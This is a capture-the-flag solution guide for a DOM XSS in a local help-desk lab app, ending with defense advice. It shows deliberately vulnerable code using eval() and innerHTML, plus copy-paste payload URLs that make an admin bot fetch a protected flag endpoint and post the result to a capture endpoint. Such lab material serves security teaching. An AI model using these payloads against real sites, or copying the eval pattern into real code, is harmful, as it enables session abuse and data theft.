# CTF_4 IntraDesk — Solution Guide

## Challenge: DOM XSS in Knowledge Base with Bot-Driven Flag Exfiltration

### Objective

Exploit a DOM-based XSS vulnerability in the Knowledge Base search page to steal your **per-user flag** from an admin-only endpoint. A moderator bot automatically visits reported URLs as an admin, so you must craft a URL that, when visited by the bot, fetches your flag and exfiltrates it to a capture endpoint you can read.

---

### Vulnerability Location

The vulnerability exists in **KnowledgeBase.tsx** in the `headerCallbackRef` callback ref function.

**Vulnerable Code (simplified):**
```tsx
const headerCallbackRef = useCallback((node: HTMLHeadingElement | null) => {
  if (node) {
    const urlParams = new URLSearchParams(window.location.search);
    const rawSearch = urlParams.get('search') || '';

    // ⚠️ Unsafe: directly inserting user input into innerHTML
    node.innerHTML = 'Results for "' + rawSearch + '"';

    // ⚠️ Unsafe: directly executing user-supplied JavaScript
    const callback = urlParams.get('callback');
    if (callback) {
      eval(callback);   // <-- arbitrary JS execution
    }
  }
}, [searchTerm, selectedTag]);
```

There are **two** XSS vectors:
1. **innerHTML injection** via the `search` parameter (HTML context)
2. **eval() injection** via the `callback` parameter (direct JavaScript execution)

The `eval(callback)` path is more reliable and is the intended solution path.

---

### Exploit Chain Overview

```
Player crafts URL with XSS payload
  → Player submits URL via /report page
    → Bot (logged in as admin) visits the URL
      → eval(callback) executes JavaScript in admin's browser session
        → JS fetches /api/admin/flag?reportId=X (admin-only endpoint)
          → API returns the flag of the user who submitted the report
            → JS POSTs the flag to /api/exfil/capture
              → Player reads the captured flag via /captures page
```

---

### Step-by-Step Exploitation

#### Step 1: Discover the `callback` Parameter XSS

Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:

```
http://localhost:5176/kb?search=test&callback=alert(1)
```

You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution via `eval()`.

**Rationale:** The Knowledge Base page reflects the `callback` URL parameter directly into `eval()` without sanitization. This is the intended vulnerability entry point.

---

#### Step 2: Confirm the Bot Visits Reported URLs

Submit a simple report that exfiltrates data to confirm the bot is actually executing your code:

1. Go to **Report** page (`/report`)
2. Submit this URL:
```
http://localhost:5176/kb?search=test&callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
```
3. After a few seconds, go to **My Captures** page (`/captures`)
4. You should see an entry with `data: 'bot_was_here'` — confirming the bot executed your payload

**Rationale:** This validates that the bot is an automated actor with a real browser session. You now know payloads you submit will be executed.

---

#### Step 3: Discover `_reportId` via Report Status

After submitting a report, the **Report** page shows a card for each report with:
- **🤖 Bot visited URL** (highlighted in blue)
- **Status badge** (green when visited)
- **Expandable bot console logs**

**Look at the "Bot visited URL" field** — it will show the exact URL the bot visited, including the `_reportId` query parameter appended by the bot.

Example: `http://localhost:5176/kb?search=test&callback=...&_reportId=7`

**Rationale:** The `_reportId` is automatically appended by the bot when visiting your URL. By viewing the report card, you can see the exact query string the bot used, revealing the `_reportId` value without needing to exfiltrate the URL yourself.

---

#### Step 4: Discover the Admin Flag Endpoint

Try to access the flag endpoint directly from the main app (the Vite dev server proxies all `/api` routes to the backend):

```
http://localhost:5176/api/admin/flag?reportId=1
```

You can also hit it from the browser DevTools console while on the site:
```javascript
fetch('/api/admin/flag?reportId=1').then(r=>r.json()).then(console.log)
```

You'll get a `403 Forbidden` response with a hint:
```json
{
  "error": "Admin access required",
  "hint": "This endpoint requires an active admin session.",
  "usage": "GET /api/admin/flag?reportId=<reportId>",
  "description": "Returns the flag associated with the given report. The flag belongs to the user who submitted the report, not the admin."
}
```

**Rationale:** The 403 response confirms that `/api/admin/flag` exists and expects a `reportId` parameter. The hint reveals that the endpoint returns a flag when accessed with admin privileges — which your bot has.

---

#### Step 5: Discover the Exfiltration Endpoint

Go to **My Captures** page (`/captures`). At the top of the page you'll always see a hint box:

```
Endpoint: POST /api/exfil/capture
Expected JSON body: {"data": ..., "reportId": ...}
No authentication required on this endpoint.
```

**Rationale:** The hint is permanently visible (not just when the list is empty), so players always have the endpoint schema on hand while crafting their payload.

---

#### Step 6: Understand the Flag System

Key facts:
- Each user has a **unique flag** stored in the database
- `GET /api/admin/flag?reportId=X` returns the flag of the **user who submitted report X** (not the admin's flag)
- The bot visits URLs as an **authenticated admin user**, so it can call the admin endpoint
- When the bot visits your URL, it automatically appends `&_reportId=X` so your payload can reference it
- You can view exfiltrated flags at `/captures` (authenticated)

**Rationale:** Understanding this data flow is critical — you must make the bot (which has admin access) fetch the admin endpoint and exfiltrate the flag back to a public endpoint you can read.

---

#### Step 7: Craft the Final Exploit Payload

Now you have all the pieces. The payload must:
1. Read `_reportId` from the URL query string (appended by the bot)
2. Fetch the admin-only `/api/admin/flag?reportId=X` endpoint
3. Wait for the JSON response (which contains your flag)
4. POST the flag to `/api/exfil/capture` endpoint
5. Include the `reportId` so you can retrieve it later

**The payload (readable with comments):**
```javascript
// Construct the admin flag URL with _reportId param
fetch('/api/admin/flag?reportId='.concat(
  new URLSearchParams(location.search).get('_reportId')
))
// Parse the response JSON
.then(function(r) {
  return r.json()
})
// Exfiltrate the flag to the public capture endpoint
.then(function(d) {
  fetch('/api/exfil/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      data: d,
      reportId: new URLSearchParams(location.search).get('_reportId')
    })
  })
})
```

**The payload (one-liner for URL parameter):**
```
fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

**Key technical detail — Use `.concat()` NOT `+`:**

In URL query strings, `+` is decoded as a **space character** (RFC 1866). This breaks string concatenation:
```
callback=a+b          →  eval("a b")       ← SyntaxError!
callback=a.concat(b)  →  eval("a.concat(b)") ← works!
```

The `.concat()` method is literally in the source code so it survives URL encoding and decoding unchanged.

---

#### Step 8: Construct and Submit the Full URL

**Safe version** (ready to copy-paste into the Report form):
```
http://localhost:5176/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

Steps to submit:
1. **Log in** with your assigned credentials (e.g., `abcd12` / `KHXXSIILQYIF`)
2. Go to **Report** page (`/report`)
3. Paste the full URL above into the **URL field**
4. Click **Submit Report**

**Rationale:** The `/report` endpoint validates that the URL is a KB path, then queues the URL to the BullMQ worker. The bot picks up the job and visits the URL as an authenticated admin.

---

#### Step 9: Wait for Bot Processing and Retrieve Your Flag

1. **Wait 2-5 seconds** for the bot to process your report from the queue
2. Go back to the **Report** page to see the updated report card
3. Check the **bot console logs** (click "Show bot console logs") to debug if anything went wrong
4. Navigate to **My Captures** page (`/captures`)
5. Your flag will appear as a captured entry containing `{"flag": "CTF{user_<username>_<hash>}"}`

**Rationale:** The bot logs in as admin, visits your URL, executes the payload in its admin session, fetches the admin-only flag endpoint (which returns your flag), and POSTs it to the public exfil endpoint. You then read it back as yourself.

---

### Technical Troubleshooting

#### Bot Console Logs Not Showing?

The **Report** page now displays bot console logs in an expandable section. Check these logs if your payload fails silently:

- **`[error]` messages** indicate JavaScript errors in your payload
- **`[log]` messages** are your `console.log()` calls (you can add these to debug)
- **`[warn]` messages** are warnings

**How to add debugging to your payload:**
```javascript
console.log('_reportId:', new URLSearchParams(location.search).get('_reportId'));
// ... rest of payload ...
```

Then check the bot console logs to verify the `_reportId` was found.

#### Flag Not Appearing in Captures?

- **Wait 5+ seconds** — the bot might still be processing
- **Check bot console logs** for errors
- **Verify the `reportId` in the exfil body** matches the actual report ID
- **Check browser console** (Ctrl+Shift+J) for any client-side errors

#### URL Plus Sign Encoding Issue

If your payload has `+` in it (like `a+b`), it will be decoded as a space in `eval()`, causing `SyntaxError`. Use `.concat()` instead:

```javascript
// ❌ Wrong — `+` becomes space after URL decoding
'hello' + 'world'

// ✅ Correct — `.concat()` survives URL encoding
'hello'.concat('world')
```

---

### Challenge Summary

| Aspect | Detail |
|---|---|
| **Vulnerability** | DOM XSS via `eval(callback)` in KnowledgeBase.tsx |
| **Bot Role** | Privileged actor (admin) that visits your reported URL |
| **Privilege Escalation** | Bot's admin session grants access to `/api/admin/flag` |
| **Key Discovery** | `_reportId` appended by bot, visible in Report card |
| **Exfiltration** | Public endpoint `/api/exfil/capture` (no auth required) |
| **Flag Retrieval** | Unique per-user flag accessed via `/captures` page |
| **Scaffolding** | Visited URL, bot console logs, and 403 hints reduce friction |

---

---

### Alternative Payloads

**Simple test (verify XSS works):**
```
http://localhost:5176/kb?search=test&callback=document.title='HACKED'
```

**Alert with cookie (confirms httpOnly is set — cookie will be empty):**
```
http://localhost:5176/kb?search=test&callback=alert(document.cookie)
```

---

### Defense Recommendations

1. **Never use `eval()`** — remove the callback parameter entirely
2. **Use `textContent` instead of `innerHTML`:**
   ```typescript
   node.textContent = `Results for "${rawSearch}"`;
   ```
3. **Sanitize with DOMPurify** if HTML rendering is needed:
   ```typescript
   import DOMPurify from 'dompurify';
   node.innerHTML = DOMPurify.sanitize(headerHTML);
   ```
4. **Implement Content Security Policy (CSP)** headers to block inline script execution
5. **Validate report URLs** server-side to only allow specific paths/patterns

---

### Flag Format

Each user gets a unique flag in the format:
```
CTF{user_<username>_<random_hex>}
```

Example: `CTF{user_abcd12_8bb73ad76fdd80e0}`

The flag is derived per-user, so sharing flags between participants won't work.

---

### OWASP Classification

This challenge covers:
- **A03:2021 — Injection** (DOM XSS via eval and innerHTML)
- **A05:2021 — Security Misconfiguration** (eval enabled, no CSP headers)
- **A07:2021 — Identification and Authentication Failures** (admin bot visits user-supplied URLs)
